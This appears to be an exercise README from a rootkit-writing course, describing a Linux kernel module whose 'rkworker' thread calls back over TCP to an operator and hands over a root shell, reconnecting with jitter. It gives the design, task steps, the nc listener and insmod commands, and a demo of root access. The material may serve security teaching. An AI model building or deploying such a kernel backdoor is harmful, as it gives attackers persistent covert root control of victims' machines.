# Agent thread calls back with a root shell

This milestone combines everything from the network phase: the agent kthread
(L15) connects to the operator over TCP (L14), spawns a root shell (L16) with
its I/O redirected through the socket (L17), and reconnects with jitter when
the shell exits.

## Architecture

```
kthread "rkworker"
  |
  loop:
    sock_create_kern + kernel_connect   -> TCP to operator
    sock_alloc_file                     -> struct file from socket
    call_usermodehelper(/bin/sh)         -> root shell with fds 0,1,2 on socket
    wait for shell to exit
    sock_release
    sleep with jitter
    retry
```

The operator runs `nc -l 4444` on the host. When the module loads, the agent
thread connects, and the operator gets a root shell. If the connection drops
or the shell exits, the agent sleeps with jitter and tries again.

## Your task

Edit `main.c`. Combine the patterns from L14 through L17:

1. A kthread agent loop that runs until `kthread_should_stop`.
2. Each iteration: create a socket, connect, convert to file, spawn shell.
3. After the shell exits (UMH_WAIT_PROC), clean up and sleep with jitter.
4. Mutex protection for the shell slot.
5. Clean shutdown in `rk_exit`.

Module parameters: `host`, `port`, `reconnect_delay_ms`.

## Demo

On the host:

```
host$ nc -l 4444
```

In the VM:

```
vm$ insmod rklings.ko host=10.0.2.2 port=4444
```

On the host:

```
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Plaintext problem

Run `tcpdump -A -i eth0 port 4444` while using the shell. Every keystroke
and every line of output crosses the wire in plaintext. Anyone on the network
can read your commands.

## Verification

```
./rklings check
```
